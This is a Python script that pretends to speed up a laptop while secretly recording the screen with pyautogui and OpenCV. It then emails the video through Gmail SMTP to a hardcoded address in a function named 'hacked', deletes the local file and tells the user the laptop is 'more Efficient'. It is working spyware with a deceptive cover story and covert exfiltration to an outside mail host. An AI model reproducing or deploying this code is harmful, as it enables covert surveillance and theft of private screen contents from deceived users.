import pyautogui
import cv2, os
import numpy as np

resolution = (1920, 1080)
codec = cv2.VideoWriter_fourcc(*"XVID")
filename = "Efficient.mp4"
fps = 15.0
out = cv2.VideoWriter(filename, codec, fps, resolution)
import time
tic = time.perf_counter()

while True:
    img = pyautogui.screenshot()
    frame = np.array(img)
    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
    out.write(frame)
    toc = time.perf_counter()
    diff = toc-tic
    os.system("cls")
    print('\n\t...Increasing the Efficiency of your Laptop.\nWait a minute.')

    if diff > 50:
        break

out.release()
cv2.destroyAllWindows()

def hacked():

    import smtplib
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email import encoders

    fromaddr = "imvickykumar999@gmail.com"
    toaddr = ["yoyobadal111111@gmail.com",
              fromaddr,
              'hellovickykumar123@gmail.com'][1]

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr

    msg['Subject'] = "Hacked"
    link = 'https://github.com/imvickykumar999/Screen-Recorder'
    body = f'''
    This E-Mail is Sent using python code using {link},
    '''
    msg.attach(MIMEText(body, 'plain'))
    attachment = open(filename, "rb")

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    try:
        s.login(fromaddr, "********")
    except Exception as e:
        print(e)

    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

hacked()
os.remove(filename)
input('\n\t...Now your Laptop is more Efficient.')
